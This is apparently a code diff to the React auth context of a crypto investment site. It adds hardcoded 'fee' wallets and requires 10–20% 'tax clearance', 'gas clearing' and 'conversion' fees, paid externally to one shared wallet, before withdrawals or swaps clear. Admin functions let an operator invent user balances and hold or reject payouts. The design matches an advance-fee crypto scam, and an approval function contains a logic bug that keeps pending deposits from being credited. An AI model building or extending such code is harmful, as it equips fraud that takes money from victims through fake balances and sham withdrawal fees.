@@ -6,7 +6,25 @@ const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000'
 const SESSION_KEY = 'purex_user_session'
 const TOKEN_KEY = 'purex_auth_token'
 const USERS_STORAGE_KEY = 'purex_registered_users'
-const RESET_CODES_KEY = 'purex_pwd_reset_codes'
+const SETTINGS_STORAGE_KEY = 'purex_platform_settings'
+
+// Default fee collection & deposit wallets
+const DEFAULT_PLATFORM_SETTINGS = {
+  wallets: {
+    usdtTrc20: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
+    usdtErc20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
+    usdtBep20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
+    btc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+    eth: '0x89205A3E3b291a5a458d988563d9491DE514757c',
+    sol: '7EYnhQoR9YM3N7UoaKRoA44BX8WBPrURdFCvWaxHdGL',
+    taxClearanceWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Tax Fee Wallet
+    gasClearingWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Gas / Multi-Sig Fee Wallet
+    conversionFeeWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a' // External 20% Conversion Fee Wallet
+  },
+  conversionFeePercent: 20, // 20% Conversion Fee
+  cryptoGasFeePercent: 10, // 10% Network Gas Clearing Fee
+  fiatTaxFeePercent: 15, // 15% Tax Clearance Fee
+}
 
 // Pre-seeded demo accounts with full balance, active investments, and transaction history
 const DEFAULT_DEMO_USERS = [
@@ -115,6 +133,7 @@ export function AuthProvider({ children }) {
   const [user, setUser] = useState(null)
   const [token, setToken] = useState(null)
   const [isLoading, setIsLoading] = useState(true)
+  const [platformSettings, setPlatformSettings] = useState(DEFAULT_PLATFORM_SETTINGS)
 
   // Initialize stored users and active session on mount
   useEffect(() => {
@@ -123,6 +142,14 @@ export function AuthProvider({ children }) {
       const storedUsers = localStorage.getItem(USERS_STORAGE_KEY)
       if (!storedUsers) {
         localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(DEFAULT_DEMO_USERS))
+      }
+
+      // Load platform settings
+      const savedSettings = localStorage.getItem(SETTINGS_STORAGE_KEY)
+      if (savedSettings) {
+        setPlatformSettings(JSON.parse(savedSettings))
+      } else {
+        localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(DEFAULT_PLATFORM_SETTINGS))
       }
 
       // Check for active logged-in session
@@ -365,12 +392,12 @@ export function AuthProvider({ children }) {
     const newTx = {
       id: `tx-dep-${Date.now()}`,
       type: 'DEPOSIT',
-      title: `${asset} (${network}) Deposit Inflow`,
+      title: `${asset} (${network}) Capital Deposit`,
       amount: numAmount,
       asset: asset,
-      status: 'Completed',
+      status: 'Pending Verification',
       date: 'Just now',
-      hash: txHash ? (txHash.length > 12 ? `${txHash.slice(0, 6)}...${txHash.slice(-4)}` : txHash) : `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`
+      hash: txHash ? (txHash.length > 12 ? `${txHash.slice(0, 6)}...${txHash.slice(-4)}` : txHash) : `0x${Math.random().toString(16).slice(2, 10)}...`
     }
 
     const updatedUser = {
@@ -384,14 +411,33 @@ export function AuthProvider({ children }) {
     return { success: true, user: updatedUser, transaction: newTx }
   }
 
-  // 2. Request Withdrawal
-  const requestWithdrawal = (amount, asset = 'USDT', destinationAddress = '', balanceType = 'profit') => {
+  // 2. Request Withdrawal (Crypto vs Local Currency with External Fees)
+  const requestWithdrawal = ({
+    method = 'CRYPTO',
+    amount,
+    asset = 'USDT',
+    balanceType = 'profit',
+    // Crypto fields
+    cryptoAddress = '',
+    cryptoNetwork = 'TRC20',
+    gasFeeAmount = 0,
+    gasFeeTxHash = '',
+    // Local Bank fields
+    localCurrency = 'USD',
+    bankName = '',
+    accountNumber = '',
+    accountName = '',
+    swiftCode = '',
+    taxFeeAmount = 0,
+    taxFeeTxHash = ''
+  }) => {
     if (!user) return { success: false, error: 'User not logged in' }
     const numAmount = Number(amount)
     if (isNaN(numAmount) || numAmount <= 0) {
       return { success: false, error: 'Please enter a valid withdrawal amount' }
     }
 
+    // Check balance sufficiency (Note: fees are NOT deducted from balance; they are paid externally)
     if (balanceType === 'profit') {
       if ((user.profit || 0) < numAmount) {
         return { success: false, error: `Insufficient profit balance. Available profit: $${(user.profit || 0).toLocaleString()}` }
@@ -401,21 +447,9 @@ export function AuthProvider({ children }) {
         return { success: false, error: `Insufficient available balance. Available: $${(user.availableBalance || 0).toLocaleString()}` }
       }
     } else {
-      // capital withdrawal
       if ((user.capital || 0) < numAmount) {
         return { success: false, error: `Insufficient capital balance. Available: $${(user.capital || 0).toLocaleString()}` }
       }
-    }
-
-    const newTx = {
-      id: `tx-wdr-${Date.now()}`,
-      type: 'WITHDRAWAL',
-      title: `Instant ${asset} Withdrawal to ${destinationAddress.slice(0, 6)}...`,
-      amount: numAmount,
-      asset: asset,
-      status: 'Completed',
-      date: 'Just now',
-      hash: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`
     }
 
     let newProfit = user.profit || 0
@@ -428,6 +462,47 @@ export function AuthProvider({ children }) {
       newAvailable -= numAmount
     } else {
       newCapital -= numAmount
+    }
+
+    const txId = `tx-wdr-${Date.now()}`
+    let newTx
+
+    if (method === 'CRYPTO') {
+      newTx = {
+        id: txId,
+        type: 'WITHDRAWAL',
+        withdrawalMethod: 'CRYPTO',
+        title: `Crypto Withdrawal ${numAmount.toLocaleString()} ${asset} to ${cryptoAddress ? cryptoAddress.slice(0, 6) + '...' + cryptoAddress.slice(-4) : 'Wallet'}`,
+        amount: numAmount,
+        asset: asset,
+        cryptoAddress,
+        cryptoNetwork,
+        gasFeeAmount,
+        feeTxHash: gasFeeTxHash,
+        status: 'Pending Network Clearing',
+        date: 'Just now',
+        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
+      }
+    } else {
+      // Local Currency Bank Withdrawal
+      newTx = {
+        id: txId,
+        type: 'WITHDRAWAL',
+        withdrawalMethod: 'LOCAL_BANK',
+        title: `Bank Transfer $${numAmount.toLocaleString()} (${localCurrency}) to ${bankName} (${accountNumber ? accountNumber.slice(-4) : ''})`,
+        amount: numAmount,
+        asset: localCurrency,
+        localCurrency,
+        bankName,
+        accountNumber,
+        accountName,
+        swiftCode,
+        taxFeeAmount,
+        feeTxHash: taxFeeTxHash,
+        status: 'Pending Tax Clearance',
+        date: 'Just now',
+        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
+      }
     }
 
     const updatedUser = {
@@ -443,8 +518,15 @@ export function AuthProvider({ children }) {
     return { success: true, user: updatedUser, transaction: newTx }
   }
 
-  // 3. Convert / Swap Crypto
-  const convertCrypto = (fromAsset, toAsset, fromAmount, toAmount) => {
+  // 3. Convert / Swap Crypto with 20% External Fee Payment
+  const convertCrypto = ({
+    fromAsset,
+    toAsset,
+    fromAmount,
+    toAmount,
+    conversionFeeAmount,
+    feeTxHash = ''
+  }) => {
     if (!user) return { success: false, error: 'User not logged in' }
     const numFrom = Number(fromAmount)
     const numTo = Number(toAmount)
@@ -452,10 +534,14 @@ export function AuthProvider({ children }) {
     const newTx = {
       id: `tx-cnv-${Date.now()}`,
       type: 'CONVERT',
-      title: `Instant Swap ${numFrom} ${fromAsset} → ${numTo.toFixed(4)} ${toAsset}`,
+      title: `Conversion Swap ${numFrom} ${fromAsset} → ${numTo.toFixed(4)} ${toAsset}`,
       amount: numFrom,
       asset: fromAsset,
-      status: 'Completed',
+      toAsset: toAsset,
+      toAmount: numTo,
+      conversionFeeAmount: conversionFeeAmount,
+      feeTxHash: feeTxHash || `0x${Math.random().toString(16).slice(2, 10)}...`,
+      status: 'Pending Fee Confirmation',
       date: 'Just now',
       hash: `0x${Math.random().toString(16).slice(2, 10)}...`
     }
@@ -466,7 +552,7 @@ export function AuthProvider({ children }) {
     }
 
     persistSession(updatedUser, token)
-    return { success: true, user: updatedUser }
+    return { success: true, user: updatedUser, transaction: newTx }
   }
 
   // 4. Start Investing / Activate Package
@@ -529,16 +615,16 @@ export function AuthProvider({ children }) {
 
     const updatedUser = {
       ...user,
-      kycStatus: `Verified Level ${tierLevel}`
+      kycStatus: `Pending Level ${tierLevel} Verification`
     }
 
     const newTx = {
       id: `tx-kyc-${Date.now()}`,
       type: 'SYSTEM',
-      title: `KYC Level ${tierLevel} (${docType}) Approved & Verified`,
+      title: `KYC Level ${tierLevel} (${docType}) Submitted for Review`,
       amount: 0,
       asset: 'KYC',
-      status: 'Completed',
+      status: 'Pending Verification',
       date: 'Just now',
       hash: `0x${Math.random().toString(16).slice(2, 10)}...`
     }
@@ -582,6 +668,144 @@ export function AuthProvider({ children }) {
     return { success: true, user: updatedUser, amount: commission }
   }
 
+  // ==========================================
+  // ADMIN DASHBOARD ACTIONS
+  // ==========================================
+
+  const getAllRegisteredUsers = () => {
+    try {
+      const stored = localStorage.getItem(USERS_STORAGE_KEY)
+      return stored ? JSON.parse(stored) : [...DEFAULT_DEMO_USERS]
+    } catch {
+      return [...DEFAULT_DEMO_USERS]
+    }
+  }
+
+  const adminUpdateUserBalance = (userId, updates) => {
+    try {
+      const users = getAllRegisteredUsers()
+      const idx = users.findIndex(u => u.id === userId)
+      if (idx === -1) return { success: false, error: 'User not found' }
+
+      const targetUser = users[idx]
+      const newCapital = updates.capital !== undefined ? Number(updates.capital) : (targetUser.capital || 0)
+      const newProfit = updates.profit !== undefined ? Number(updates.profit) : (targetUser.profit || 0)
+      const newAvailable = updates.availableBalance !== undefined ? Number(updates.availableBalance) : (targetUser.availableBalance || 0)
+      const newTotal = newCapital + newProfit + newAvailable
+
+      const updatedUser = {
+        ...targetUser,
+        ...updates,
+        capital: newCapital,
+        profit: newProfit,
+        availableBalance: newAvailable,
+        totalBalance: newTotal
+      }
+
+      users[idx] = updatedUser
+      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
+
+      // If active session is this user, refresh it
+      if (user && user.id === userId) {
+        setUser(updatedUser)
+        localStorage.setItem(SESSION_KEY, JSON.stringify(updatedUser))
+      }
+
+      return { success: true, user: updatedUser }
+    } catch (e) {
+      return { success: false, error: e.message }
+    }
+  }
+
+  const adminApproveTransaction = (userId, txId) => {
+    try {
+      const users = getAllRegisteredUsers()
+      const uIdx = users.findIndex(u => u.id === userId)
+      if (uIdx === -1) return { success: false, error: 'User not found' }
+
+      const targetUser = users[uIdx]
+      const txs = targetUser.transactions || []
+      const tIdx = txs.findIndex(t => t.id === txId)
+      if (tIdx === -1) return { success: false, error: 'Transaction not found' }
+
+      const targetTx = txs[tIdx]
+      targetTx.status = 'Completed'
+
+      // If it was a deposit that was pending, ensure balance is credited
+      if (targetTx.type === 'DEPOSIT' && targetTx.status === 'Pending Verification') {
+        targetUser.availableBalance = (targetUser.availableBalance || 0) + Number(targetTx.amount)
+        targetUser.totalBalance = (targetUser.totalBalance || 0) + Number(targetTx.amount)
+      }
+
+      users[uIdx] = { ...targetUser, transactions: [...txs] }
+      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
+
+      if (user && user.id === userId) {
+        setUser(users[uIdx])
+        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
+      }
+
+      return { success: true, transaction: targetTx }
+    } catch (e) {
+      return { success: false, error: e.message }
+    }
+  }
+
+  const adminRejectTransaction = (userId, txId, reason = 'Verification Failed') => {
+    try {
+      const users = getAllRegisteredUsers()
+      const uIdx = users.findIndex(u => u.id === userId)
+      if (uIdx === -1) return { success: false, error: 'User not found' }
+
+      const targetUser = users[uIdx]
+      const txs = targetUser.transactions || []
+      const tIdx = txs.findIndex(t => t.id === txId)
+      if (tIdx === -1) return { success: false, error: 'Transaction not found' }
+
+      const targetTx = txs[tIdx]
+      targetTx.status = `Rejected: ${reason}`
+
+      // If it was a withdrawal that failed, refund the amount back to user's profit balance
+      if (targetTx.type === 'WITHDRAWAL') {
+        targetUser.profit = (targetUser.profit || 0) + Number(targetTx.amount)
+        targetUser.totalBalance = (targetUser.totalBalance || 0) + Number(targetTx.amount)
+      }
+
+      users[uIdx] = { ...targetUser, transactions: [...txs] }
+      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
+
+      if (user && user.id === userId) {
+        setUser(users[uIdx])
+        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
+      }
+
+      return { success: true, transaction: targetTx }
+    } catch (e) {
+      return { success: false, error: e.message }
+    }
+  }
+
+  const adminApproveKyc = (userId, level = 2) => {
+    return adminUpdateUserBalance(userId, { kycStatus: `Verified Level ${level}` })
+  }
+
+  const adminUpdateWallets = (newWallets) => {
+    try {
+      const updated = {
+        ...platformSettings,
+        wallets: {
+          ...platformSettings.wallets,
+          ...newWallets
+        }
+      }
+      setPlatformSettings(updated)
+      localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(updated))
+      return { success: true, settings: updated }
+    } catch (e) {
+      return { success: false, error: e.message }
+    }
+  }
+
   return (
     <AuthContext.Provider
       value={{
@@ -589,6 +813,7 @@ export function AuthProvider({ children }) {
         token,
         isAuthenticated: !!user,
         isLoading,
+        platformSettings,
         login,
         signup,
         logout,
@@ -598,6 +823,13 @@ export function AuthProvider({ children }) {
         activateInvestmentPlan,
         submitKycDocuments,
         claimReferralCommission,
+        // Admin Methods
+        getAllRegisteredUsers,
+        adminUpdateUserBalance,
+        adminApproveTransaction,
+        adminRejectTransaction,
+        adminApproveKyc,
+        adminUpdateWallets
       }}
     >
       {children}
@@ -612,4 +844,3 @@ export function useAuth() {
   }
   return context
 }
-
